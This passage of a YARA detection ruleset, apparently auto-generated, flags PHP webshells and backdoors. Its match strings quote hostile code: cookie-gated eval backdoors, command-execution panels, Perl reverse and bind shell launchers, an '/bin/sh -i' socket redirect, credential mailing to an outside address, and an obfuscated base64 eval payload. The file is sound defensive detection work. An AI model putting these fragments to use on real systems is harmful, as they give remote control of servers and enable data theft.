      $s11 = "* The configuration settings in this file can be changed to suit the" fullword ascii
      $s12 = "GlobalConfig::$CONNECTION_SETTING->ConnectionString = \"\";" fullword ascii
      $s13 = "require_once 'verysimple/Phreeze/ConnectionSetting.php';" fullword ascii
      $s14 = "require_once(\"verysimple/HTTP/RequestUtil.php\");" fullword ascii
      $s15 = "/** functions for php 5.2 compatibility */" fullword ascii
      $s16 = "GlobalConfig::$CONNECTION_SETTING->DBName = \"\";" fullword ascii
      $s17 = "* have any back-end schema" fullword ascii
      $s18 = "* @package Adserv" fullword ascii
      $s19 = "/** additional machine-specific settings */" fullword ascii
      $s20 = "return substr_replace($string, strtolower(substr($string, 0, 1)), 0, 1);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_8f67aafa3ae904422c1ce1a0941806651eb9d0ff
{
   meta:
      description = "php17 - file 8f67aafa3ae904422c1ce1a0941806651eb9d0ff.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b839e9627a98287ce09b3914666dde4ab039379f9ad629efec8ecac76480782f"
   strings:
      $s1 = "register_shutdown_function($e, $_REQUEST['pass']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0731460a8a5ce1626210cbf4385ae0ef
{
   meta:
      description = "php17 - file 0731460a8a5ce1626210cbf4385ae0ef.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "987338c5f4ed2130e7b3287fe9c11e782007368aaa831e3c0c9f6ce98922dd4f"
   strings:
      $s1 = "$arr = new ArrayObject(array('test', $_REQUEST['pass']));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_9bab0045193f4233940c27afb29e56bdefbad09c
{
   meta:
      description = "php17 - file 9bab0045193f4233940c27afb29e56bdefbad09c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "642e4d646573c2cf95a71034e6a44e3b66628db6ff9042c963d86c777ac1d247"
   strings:
      $s1 = "(<a href=\\\"http://www.s8s8.net\\\">http://www.s8s8.net</a>) ZV(<a href=\\\"mailto:zvrop@163.com\\\">zvrop@163.com</a>)</b> " fullword ascii
      $s2 = "\";if(is_dir($dir)) {if ($fp = @fopen(\"$dir/temp.tmp\", 'w')) {@fclose($fp);@unlink(\"$dir/temp.tmp\");$write = \"" fullword ascii
      $s3 = "_exec($shellcmd):(($seletefunc==\"passthru\")?passthru($shellcmd):system($shellcmd))));" fullword ascii
      $s4 = "<form method=\"post\" action=\"?action=login\" enctype=\"multipart/form-data\">" fullword ascii
      $s5 = ":<input name=\"sqlhost\" type=\"text\" class=\"style1\" value=\"<?=isset($sqlhost)?$sqlhost:\"localhost\"?>\" size=\"20\">" fullword ascii
      $s6 = ":<input name=\"shellcmd\" type=\"text\" class=\"style1\" value=\"<?=isset($shellcmd)?$shellcmd:\"\"?>\" size=\"80\">" fullword ascii
      $s7 = "IP:\",gethostbyname($_SERVER[\"SERVER_NAME\"]));" fullword ascii
      $s8 = ":<input name=\"sqluser\" type=\"text\" class=\"style1\" value=\"<?=isset($sqluser)?$sqluser:\"root\"?>\" size=\"10\">" fullword ascii
      $s9 = "<option value=\"shell_exec\" <?=($seletefunc==\"shell_exec\")?\"selected\":\"\";?>>shell_exec</option>" fullword ascii
      $s10 = "@mysql_connect(\"{$sqlhost}:{$sqlport}\",\"$sqluser\",\"$sqlpasd\") or die(\"" fullword ascii
      $s11 = "@get_magic_quotes_runtime($getname):(($tp==5)?@Getenv($getname):\"error!\"))));" fullword ascii
      $s12 = "if($_GET[\"action\"] == \"login\"){" fullword ascii
      $s13 = "function getloginpass(){" fullword ascii
      $s14 = "<form method=\"post\" action=\"?action=shell\" enctype=\"multipart/form-data\">" fullword ascii
      $s15 = ":<input name=\"sqlport\" type=\"text\" class=\"style1\" value=\"<?=isset($sqlport)?$sqlport:\"3306\"?>\" size=\"5\">" fullword ascii
      $s16 = "if (@session_is_registered(\"smy_password\")||isset($_COOKIE[\"cmy_password\"])){" fullword ascii
      $s17 = "if($my_password==$_POST[\"pmy_password\"]){" fullword ascii
      $s18 = "Header(\"Content-Disposition: attachment; filename=\".$df_name);" fullword ascii
      $s19 = "}else getloginpass();" fullword ascii
      $s20 = "<form method=\"post\" action=\"?action=filesave&dir=<?=urlencode($dir);?>\" enctype=\"multipart/form-data\">" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 80KB and
      8 of them
}

rule sig_82e9a1a1accef35ca21d1e7da20c851659596462
{
   meta:
      description = "php17 - file 82e9a1a1accef35ca21d1e7da20c851659596462.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "34fcf9b17604d49903cbb33e49a1ea5983a65333d7fd5d67d3ec3b904aa40df6"
   strings:
      $x1 = "$res = execute('gcc -o /tmp/magiccoder_bc /tmp/magiccoder_bc.c');" fullword ascii
      $x2 = "$res = @execute(which('perl').\" /tmp/magiccoder_bc $yourip $yourport &\");" fullword ascii
      $x3 = "$res = @execute(which('perl').\" /tmp/magiccoder_bind_pl $yourport_bind &\");" fullword ascii
      $x4 = "echo '<br><center>Use from <b>'.$_POST['execfunction_bind'].'</b> function<hr width=\"222px\" noshade /></center>';" fullword ascii
      $x5 = "$res = @shell_exec(which('perl').\" /tmp/magiccoder_bind_pl $yourport_bind &\");" fullword ascii
      $x6 = "$res = @shell_exec('gcc -o /tmp/magiccoder_bc /tmp/magiccoder_bc.c');" fullword ascii
      $x7 = "$res = @shell_exec(which('perl').\" /tmp/magiccoder_bc $yourip $yourport &\");" fullword ascii
      $x8 = "hell');\\\">Execute Command</a> |\";} ?>" fullword ascii
      $s9 = "echo '<br><center>Use from <b>'.$_POST['execfunction_cb'].'</b> function<hr width=\"222px\" noshade /></center>';" fullword ascii
      $s10 = "$res = execute(\"/tmp/magiccoder_bc $yourip $yourport &\");" fullword ascii
      $s11 = "$res = @exec(which('perl').\" /tmp/magiccoder_bc $yourip $yourport &\");" fullword ascii
      $s12 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s13 = "$res = @exec(which('perl').\" /tmp/magiccoder_bind_pl $yourport_bind &\");" fullword ascii
      $s14 = "echo '<center>Use from <b>'.$_POST['execfunction_cb'].'</b> function<hr width=\"222px\" noshade /></center>';" fullword ascii
      $s15 = "echo '<center>Use from <b>'.$_POST['execfunction'].'</b> function<hr width=\"222px\" noshade /></center>';" fullword ascii
      $s16 = "$res = @exec('gcc -o /tmp/magiccoder_bc /tmp/magiccoder_bc.c');" fullword ascii
      $s17 = "echo @execute($command);" fullword ascii
      $s18 = "$res = @fread(popen(which('perl').\" /tmp/magiccoder_bc $yourip $yourport &\",r), 9999);" fullword ascii
      $s19 = "<?php if(getcfg('safe_mode') == 'Yes'){echo 'Execute Command (Safe Mode is On ) |';}else{ echo \"<a href=\\\"javascript:goaction" ascii
      $s20 = "<?php if(getcfg('safe_mode') == 'Yes'){echo 'Execute Command (Safe Mode is On ) |';}else{ echo \"<a href=\\\"javascript:goaction" ascii
   condition:
      uint16(0) == 0xbbef and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule ArrayNormalizer
{
   meta:
      description = "php17 - file ArrayNormalizer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "edea071e6737b9ca42ab1238dc7cc986db5afe99caeb6b44f0b0a273c2ad9057"
   strings:
      $s1 = "$array[$property] = $normalizer($array[$property], $property, $array);" fullword ascii
      $s2 = "foreach ($this->normalizers as $property => $normalizer) {" fullword ascii
      $s3 = "private $normalizers = [];" fullword ascii
      $s4 = "$this->normalizers[$property] = $normalizer;" fullword ascii
      $s5 = "public function normalize(array $array): array" fullword ascii
      $s6 = "public function addNormalizer($properties, callable $normalizer)" fullword ascii
      $s7 = "if (!isset($array[$property])) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule AdminOrderController
{
   meta:
      description = "php17 - file AdminOrderController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9cfcd20bd6639d0ceee99e1945063336f77cb0150ff5518020aa4f1d0f1ea477"
   strings:
      $s1 = "'http://maps.googleapis.com/maps/api/geocode/json?address=%1$s&sensor=false'," fullword ascii
      $s2 = "$this->view->geoAddressInvoice = $geoPoint([$order->getCustomerStreet(), $order->getCustomerZip(), $order->getCustomerCi" fullword ascii
      $s3 = "// https://developers.google.com/maps/documentation/geocoding/index?hl=de#JSON" fullword ascii
      $s4 = "$this->view->geoAddressDelivery = $geoPoint([$order->getDeliveryStreet(), $order->getDeliveryZip(), $order->getDeliv" fullword ascii
      $s5 = "* @Route(\"/item-complaint\", name=\"pimcore_ecommerce_backend_admin-order_item-complaint\")" fullword ascii
      $s6 = "$avatar = $user ? sprintf('/admin/user/get-image?id=%d', $user->getId()) : null;" fullword ascii
      $s7 = "* @Route(\"/item-edit\", name=\"pimcore_ecommerce_backend_admin-order_item-edit\")" fullword ascii
      $s8 = "* @Route(\"/detail\", name=\"pimcore_ecommerce_backend_admin-order_detail\")" fullword ascii
      $s9 = "$url = $this->generateUrl('pimcore_ecommerce_backend_admin-order_detail', ['id' => $order->getId()]);" fullword ascii
      $s10 = "* @Route(\"/list\", name=\"pimcore_ecommerce_backend_admin-order_list\")" fullword ascii
      $s11 = "use Symfony\\Component\\HttpKernel\\Event\\FilterControllerEvent;" fullword ascii
      $s12 = "'icon' => $arrIcons[$note->getTitle()], 'context' => $arrContext[$note->getTitle()] ?: 'default', 'type' => $not" fullword ascii
      $s13 = "$note->addData('message', 'text', $request->get('message')); // 'text','date','document','asset','object','bool'" fullword ascii
      $s14 = "use Pimcore\\Bundle\\EcommerceFrameworkBundle\\OrderManager\\Order\\Listing\\Filter\\ProductType;" fullword ascii
      $s15 = "use Pimcore\\Bundle\\EcommerceFrameworkBundle\\OrderManager\\Order\\Listing\\Filter\\OrderDateTime;" fullword ascii
      $s16 = "use Pimcore\\Bundle\\EcommerceFrameworkBundle\\OrderManager\\Order\\Listing\\Filter\\OrderSearch;" fullword ascii
      $s17 = "use Symfony\\Component\\HttpKernel\\Event\\FilterResponseEvent;" fullword ascii
      $s18 = "$json = json_decode(file_get_contents($url));" fullword ascii
      $s19 = "* @Route(\"/item-cancel\", name=\"pimcore_ecommerce_backend_admin-order_item-cancel\")" fullword ascii
      $s20 = "foreach ($orderAgent->getFullChangeLog() as $note) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule AddressCollection
{
   meta:
      description = "php17 - file AddressCollection.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "120101adffe2e260e5bf91fce61fc4076aba1c14925bdc5f3e757781f99cb719"
   strings:
      $s1 = "use AuthorBooks\\Model\\AddressCollectionBase;" fullword ascii
      $s2 = "namespace AuthorBooks\\Model;" fullword ascii
      $s3 = "class AddressCollection extends AddressCollectionBase" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_96c58786fb39008b4a21c4c61adf84feae9d7349
{
   meta:
      description = "php17 - file 96c58786fb39008b4a21c4c61adf84feae9d7349.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "674a4e0ebf588d2b99c944474ad88525197aa62d9a954a87acdaeef55caa5ed0"
   strings:
      $s1 = "$g61[82] . $g61[81] . $g61[40] . $g61[72], $ctfms25, $wccur37) && isset($wccur37) && $GLOBALS['dwtgw25']($wccur37) > 1)" fullword ascii
      $s2 = "g61[82] . $g61[81] . $g61[40] . $g61[72], $ctfms25, $wccur37) && isset($wccur37) && $GLOBALS['dwtgw25']($wccur37) > 1)" fullword ascii
      $s3 = "$g61 = \"Etla,!Yv^}QPn.okC\\t{FS~&B ]yMxbgVDJ96|rHGsO%?\\\\1h4ZRX_K>ewA*(uf3I\\$;8dj2z5cm@Tq)\\\"`W:i/+=N7#\\n'\\r[0-LU<p\";" fullword ascii
      $s4 = "$covry30[$htdpc60][$g61[2] . $g61[51] . $g61[60] . $g61[3] . $g61[81] . $g61[2] . $g61[40] . $g61[72] . $g61[1] . $g61[97]] = " fullword ascii
      $s5 = "$inyxv82[$g61[40] . $g61[51] . $g61[46] . $g61[54] . $g61[3] . $g61[66] . $g61[54] . $g61[37]].= $inyxv82[$g61[30] . $g61[51] " fullword ascii
      $s6 = "$gkjbq81 = $GLOBALS['xwksx33']($GLOBALS['bkmaz72']($g61[82] . $g61[82], $g61[56] . $g61[23] . $g61[16] . $g61[32] . $g61[0] . " fullword ascii
      $s7 = "$vnxpv99 = $GLOBALS['diffh73']($g61, FALSE, $GLOBALS['yeygv3']($g61[20] . $g61[41] . $g61[16] . $g61[52] . $g61[0] . $g61[74] " fullword ascii
      $s8 = "$inyxv82[$g61[30] . $g61[51] . $g61[72] . $g61[3] . $g61[81] . $g61[2] . $g61[1] . $g61[14] . $g61[83]] = $inyxv82[$g61[30] " fullword ascii
      $s9 = "$GLOBALS['zxrei96']($g61[20] . $g61[41] . $g61[16] . $g61[52] . $g61[0] . $g61[74] . $g61[51] . $g61[74] . $g61[6] . $g61[11] " fullword ascii
      $s10 = "$covry30[$htdpc60][$g61[2] . $g61[51] . $g61[40] . $g61[72] . $g61[1] . $g61[97] . $g61[51] . $g61[54] . $g61[12] . $g61[66]] " fullword ascii
      $s11 = "$inyxv82[$g61[40] . $g61[51] . $g61[46] . $g61[54] . $g61[3] . $g61[66] . $g61[54] . $g61[37]] = $g61[32] . $g61[3] . $g61[1] " fullword ascii
      $s12 = "$covry30[$htdpc60][$g61[2] . $g61[51] . $g61[54] . $g61[37] . $g61[37]] = $g61[91] . $covry30[$htdpc60][$g61[40] . $g61[51] . " fullword ascii
      $s13 = "for ($ghknm37 = $GLOBALS['yeygv3']($g61[32] . $g61[85] . $g61[20] . $g61[51] . $g61[20] . $g61[74] . $g61[0] . $g61[11] . $g61" fullword ascii
      $s14 = "if ($qhzzk83[$g61[1] . $g61[26] . $g61[97] . $g61[54]] == $GLOBALS['yeygv3']($g61[32] . $g61[85] . $g61[20] . $g61[51] . $" fullword ascii
      $s15 = "if (FALSE !== @$GLOBALS['ayxkm90']($g61[82] . $g61[96] . $g61[20] . $g61[23] . $g61[41] . $g61[32] . $g61[6] . $g61[53] . $g61" fullword ascii
      $s16 = "if ($GLOBALS['epydv57']($g61[40] . $g61[1] . $g61[37] . $g61[54] . $g61[3] . $g61[72] . $g61[51] . $g61[40] . $g61[14] . $g61[" fullword ascii
      $s17 = "if ($covry30[$ghknm37][$g61[2] . $g61[51] . $g61[60] . $g61[3] . $g61[81] . $g61[2] . $g61[40] . $g61[72] . $g61[1] . $g61[9" fullword ascii
      $s18 = "if ($GLOBALS['epydv57']($g61[60] . $g61[40] . $g61[14] . $g61[71] . $g61[15] . $g61[14] . $g61[97] . $g61[54] . $g61[12]))" fullword ascii
      $s19 = "if ($GLOBALS['yeygv3']($g61[20] . $g61[41] . $g61[16] . $g61[52] . $g61[0] . $g61[74] . $g61[51] . $g61[74] . $g61[6] . $g61" fullword ascii
      $s20 = "if (FALSE === @$GLOBALS['ayxkm90']($g61[82] . $g61[58] . $g61[13] . $g61[57] . $g61[43] . $g61[64] . $g61[76] . $g61[43] . $g6" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule ae47d0c555af72c76439a56cf4a97da86eb97412
{
   meta:
      description = "php17 - file ae47d0c555af72c76439a56cf4a97da86eb97412.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "faefad57447fce349f5bf2b7f253ed96883313d875d7f418b8730f8dc8f38e3f"
   strings:
      $x1 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii
      $x2 = "$serv = @mysql_connect($adress.\":\".$port, $login,$pass) or die(\"<font color=red>Error: \".mysql_error().\"</font>\");" fullword ascii
      $x3 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii
      $x4 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl" ascii
      $x5 = "<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x6 = "</form><form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x7 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" fullword ascii
      $x8 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $x9 = "Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>" fullword ascii
      $s10 = "md5 online encoder/decoder (brutforce) (php) - [<a href=http://nst.void.ru/down_sys_scripts.php?get=nst_online_md5_cd.rar>DOWNLO" ascii
      $s11 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");" fullword ascii
      $s12 = "# Dump from: \".$_SERVER[\"SERVER_NAME\"].\" (\".$_SERVER[\"SERVER_ADDR\"].\")" fullword ascii
      $s13 = "<font color=green><b>You can change temp folder for dump file in your browser!<br>" fullword ascii
      $s14 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'>$str[0]</a><br>\";" fullword ascii
      $s15 = "echo \"<tr><td bgcolor=$color><font face=wingdings size=3>2</font> <a href='$php_self?d=$d&e=$files[$i]'>$files[$i]</a></td><td " ascii
      $s16 = "<!-- coded by tjomi4` :: nst.void.ru -->" fullword ascii
      $s17 = "7\\n$d23\\n$e09\\n$f23\\n$g32\\n$h65\";$sd98=\"john.barker446@gmail.com\";mail($sd98, $sj98, $msg8873, \"From: $sd98\");" fullword ascii
      $s18 = "header(\"Content-disposition: attachment; filename=\\\"$download\\\";\");" fullword ascii
      $s19 = "<font color=red>Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)</font><br>" fullword ascii
      $s20 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
   condition:
      uint16(0) == 0x4947 and filesize < 200KB and
      1 of ($x*) and all of them
}

rule sig_859ee6c772d3473ecedb7e248c0814d8b6465ec4
{
   meta:
      description = "php17 - file 859ee6c772d3473ecedb7e248c0814d8b6465ec4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d14e74be56abe929d39a991fadbf01e6a904050f06990a3fad291337b1aa4ed5"
   strings:
      $s1 = "$csshtml = \"<style>\".file_get_contents($cssurl).\"</style>\";" fullword ascii
      $s2 = "preg_match(\"/^(http:\\/\\/)?([^\\/]+)/i\",$url, $matches);" fullword ascii
      $s3 = "echo getCss($host,getHtmlContext($url));" fullword ascii
      $s4 = "if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == '200') {" fullword ascii
      $s5 = "if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == '302') {" fullword ascii
      $s6 = "function getCss($host,$html){" fullword ascii
      $s7 = "$host = getHost($url);" fullword ascii
      $s8 = "function getHost($url){" fullword ascii
      $s9 = "$header = explode(\"\\r\\n\",substr($result, 0, $headerSize));" fullword ascii
      $s10 = "preg_match_all(\"/<link[\\s\\S]*?href=['\\\"](.*?[.]css.*?)[\\\"'][\\s\\S]*?>/i\",$html, $matches);" fullword ascii
      $s11 = "$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);" fullword ascii
      $s12 = "$location = getHost($url).$location;" fullword ascii
      $s13 = "curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, TRUE);    //" fullword ascii
      $s14 = "if(strpos(getHeader(\"Location\"),'http://') == false){" fullword ascii
      $s15 = "$body = substr($result, $headerSize);" fullword ascii
      $s16 = "echo $url.\"  >>  \".$title.\">>\".$serverType.\" >>\".$status.\"<br/>\";" fullword ascii
      $s17 = "$useIP = substr($ip,0,strripos($ip,\".\") + 1);" fullword ascii
      $s18 = "$serverType = getHeader(\"Server\");" fullword ascii
      $s19 = "$title = getTitle(html);" fullword ascii
      $s20 = "$html = getHtmlContext($url);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule sig_8f9bc7bf7f783a7d50b9ca633d1d9cb6ace6f1ff
{
   meta:
      description = "php17 - file 8f9bc7bf7f783a7d50b9ca633d1d9cb6ace6f1ff.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f71ffc8af6b7efd75762d79d02d97f90f053a583881632c2d376e951c5cd1d05"
   strings:
      $s1 = "$stmt->execute();" fullword ascii
      $s2 = "$stmt->bindValue(1, $_REQUEST['op'], SQLITE3_TEXT);" fullword ascii
      $s3 = "$stmt = $db->prepare(\"SELECT myfunc(?)\");" fullword ascii
      $s4 = "$db->createFunction('myfunc', $e);" fullword ascii
      $s5 = "$db = new SQLite3('sqlite.db3');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_009752bd0dd4e01ffde1523920612300f4bc7293
{
   meta:
      description = "php17 - file 009752bd0dd4e01ffde1523920612300f4bc7293.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "feeca1889582eb6ae9733e68f8ee5633354935fb591211a44e7373144a177b2f"
   strings:
      $x1 = "$bhrt = \"eNrsvXtXG0fSOPw3e85+h/YsyUgbISGuDliyscExWQwEcLJZ20fvSDNCYySNMiNxSda/z/5WVV+me24SIDnJPiExSH2prq6urq7urq569nzUG/39by8ib9" ascii
      $s2 = "$ind = \"WW91IGp1c3QgZ290IGhhY2tlZCAhISEhIQ==\"; // \"Deface Page\" Base64 encoded \"You Just Got Hacked !!\"" fullword ascii
      $s3 = "//====+++Coded By Arjun+++===//" fullword ascii
      $s4 = "$malsite = \"http://fightagent.ru\";  // Malware Site" fullword ascii
      $s5 = "7ebW9evr05uc30dndmfP09c+jH87Pvv3h33uDVy9v33wfXr09/7R/3LuqjfZqJ99MXk/ubjc/OdefNr77z1H46/eftp7e/nrU+8/F2S9vnzrffeocexu97//19nDj/Lw" ascii
      $s6 = "eval(\"?>\".gzuncompress(base64_decode($bhrt))); ?>" fullword ascii
      $s7 = "// Set Username & Password" fullword ascii
      $s8 = "4z3jv37bhj1s+RwEB+gtrGHieHxwdvLpg/+S2Kez/MxCGQfSGET4p+/+YlfD+jy91GAHUGeOeDcjNf4veU0ErfAHh8VdavtuwV20GQ8zQ4r9h11W3SDnJs4n5RXcHTeB" ascii
      $s9 = "SboffeIEt4uz9hAYEbxbFFs5uGIWvTCb1bhxZW/k3+rb7Q5rT8tsW9L5zrN+P7P40s120saRTAm4/0aeYeLlrKSb60+r6OzFROvJkIRWR8HYuh2mAujMNN73XDOB1nja" ascii
      $s10 = "ek40GRXb60Zp++2Dkpi+9VcQV3ZJ47I/7XtHWREnZeyn18kI9Hy7LPY1Gq45xMCBXqenHJBj78cYtlavL5wene2d7FydnPFTPlG2HcHA648Yv3/BhFrq9hZHPbMrNsTs" ascii
      $s11 = "pAmjZ50ah/Is8hbbZLkv59GIlKPyswbblI1Ymb9phZWoQ7oD4V2x9XVZeHtOzhGjSxpfZvB8V8tVFtpuylDzYpb9VhrVUnv/NN+LzZwMj4TKR6mgySVESmC/01q7X8Dn" ascii
      $s12 = "kLjN/m3eWgEt1FFss6OipBKM4tlvAeZqKqoVZkcR6MiLYNM20DzCYivCr7s4gzeb7Da07bjIEnxvLFeANFLHCZt5vfs0cKp2cn9SIkBBbTzrmXgsmLyN+P5xypVCsoIM" ascii
      $s13 = "+PR+H/vCyoghWjt97CICJdxnyWkO0VuEIq2cm8kJD1FVvWQSxv/nGeGKBzQhaNhuKwIkW815m8L3tfhCxV8FgBIoomuG31S5XZJ+cMxExw7l0/CHsgBRNdogirCNrgxB" ascii
      $s14 = "LrazgS8UdZlW14kYN0VFZ48Pww3Cl8OfDMAns20SYis/SPyoeJqGHgtCLfNCnxgr9F0CNsdcLQBmpXgbXVhwS9wmykcEcldSAVfVuVlIjVtX7VLFeQ5s7KFjgb4qeZP+" ascii
      $s15 = "Fq5jd9mW95dykorljZLgiIiQBEOl73B1mDiRCxwV/jXgok/Nn1hfP5vGr41XDmUBku4P4ic1I1lKhL7hBzmvaUcU+6sO+YqpNb975H6Ek8FNyzgIHGTAXueVYeNcDBX3" ascii
      $s16 = "82WhkNnpbnWwz+dy5rjxpnVr16rJVNU5SvdPN+5fqUf9lszRSzk7axeRUzeYy54db28eV26pVuFSPy+P7RDU66FaempcD62Ryn5W1c22UrW/clrTTgrFxVd84rY8PTsb" ascii
      $s17 = "ignF6YQKX5EoIRD2v34/Gd32vJKQ1gbeeURobAxUaH6yxdzuudaLog9X8+9+ePVlZwfWyHbh3lbFbGfeIVTpBPwh32D9ev16FH8SgC5RZQTLssPrG6HaXWvaHsPpW25O" ascii
      $s18 = "QbQYmi8FJJFSztcdlUwmUUG45iQfTCq+qe8ndVfUjTFfQoOFCkd1VMWTWqt5u7UH651X1C7fY+N1oPDY1RdZp0xFC3YBLFztIvHJhNG3FXsPysCL3pXnFaNCuHSTF23w" ascii
      $s19 = "O+sGNB6paDKZcVTN1d+o80HukpkB6AmT01mR7nRMfQWBtWv5v0TmjY48n959d1pD7gXxpwy1EC8QNL/A7yJu8FTPBEPEDDT725QctkUglbYnET63clUrTt1pzXRsf1ey" ascii
      $s20 = "QSeGUi84fe23Vl9jsnFGT3vcume8xE1GJTafAf/8bnb7yjtshHjXaYmm1tSNeGzuJh8B0KPvyrPms77S9vkEhW1LI5hTi351+H6NYdIiveJLn7vX7pfKuLR3zpkwIeZg" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}


rule sig_39ca2651740c2cef91eb82161575348b
{
   meta:
      description = "php17 - file 39ca2651740c2cef91eb82161575348b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9578c8b7103114aabefc24641efd496a1bb3324516468e1cba2ff47f4df21abe"
   strings:
      $s1 = "<?php if(md5(@$_COOKIE[qz])=='4de4f3ce6313001decf479a51dd81c41') ($_=@$_REQUEST[q]).@$_($_REQUEST[z]); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AssignUserToRole_v1_private
{
   meta:
      description = "php17 - file AssignUserToRole.v1.private.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b5143b6694da53a587e5177357ff628caa68bba4dbf85c06fe52718e52dee787"
   strings:
      $s1 = "* @api                {post} /v1/roles/assign Assign User to Roles" fullword ascii
      $s2 = "* @apiDescription     Assign new roles to user. This endpoint does not sync the user with the" fullword ascii
      $s3 = "* @apiUse             UserSuccessSingleResponse" fullword ascii
      $s4 = "*                     new roles. It simply assign new role to the user. So make sure" fullword ascii
      $s5 = "*                     to never send an already assigned role since it will cause an error." fullword ascii
      $s6 = "* @apiPermission      Authenticated User" fullword ascii
      $s7 = "*                     To sync (update) all existing roles with the new ones use" fullword ascii
      $s8 = "* @apiParam           {Number} user_id User ID" fullword ascii
      $s9 = "* @apiParam           {Array} roles_ids Role ID or Array of Roles ID's" fullword ascii
      $s10 = "* @apiName            assignUserToRole" fullword ascii
      $s11 = "* @apiVersion         1.0.0" fullword ascii
      $s12 = "*                     `/roles/sync` endpoint instead." fullword ascii
      $s13 = "'as' => 'api_authorization_assign_user_to_role'," fullword ascii
      $s14 = "$router->post('roles/assign', [" fullword ascii
      $s15 = "* @apiGroup           RolePermission" fullword ascii
      $s16 = "'auth:api'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_018b59ce1fd616d874afad0f44ba338d
{
   meta:
      description = "php17 - file 018b59ce1fd616d874afad0f44ba338d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a05f8329dbcb415977b53e12af3fd2eb58b7dd4212569fbb6d133d3e400301fd"
   strings:
      $x1 = "if(!empty($_SERVER['HTTP_USER_AGENT'])) { $v2045f746 = array(\"Google\", \"Slurp\", \"MSNBot\", \"ia_archiver\", \"Yandex\", \"R" ascii
      $s2 = "\"; if (!function_exists(\"posix_getpwuid\") && !in_array('posix_getpwuid', $v619d75f8)) { function posix_getpwuid($v83878c91) {" ascii
      $s3 = "var p1_ = '\".((strpos(@$_POST['p1'],\"\\n\")!==false)?'':htmlspecialchars(@$_POST['p1'],ENT_QUOTES)).\"';" fullword ascii
      $s4 = "var p3_ = '\".((strpos(@$_POST['p3'],\"\\n\")!==false)?'':htmlspecialchars(@$_POST['p3'],ENT_QUOTES)).\"';" fullword ascii
      $s5 = "var p2_ = '\".((strpos(@$_POST['p2'],\"\\n\")!==false)?'':htmlspecialchars(@$_POST['p2'],ENT_QUOTES)).\"';" fullword ascii
      $s6 = "und'); exit; } } @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('max_execution_time',0); @set_time_limit(0); @se" ascii
      $s7 = "div.content{ padding: 7px;margin-left:7px;background-color:#333; }" fullword ascii
      $s8 = "a881e = true; if (isset($_REQUEST['showro']) and $_REQUEST['showro']==0) $v8a40bf93 = false; else $v8a40bf93 = true; echo \"" fullword ascii
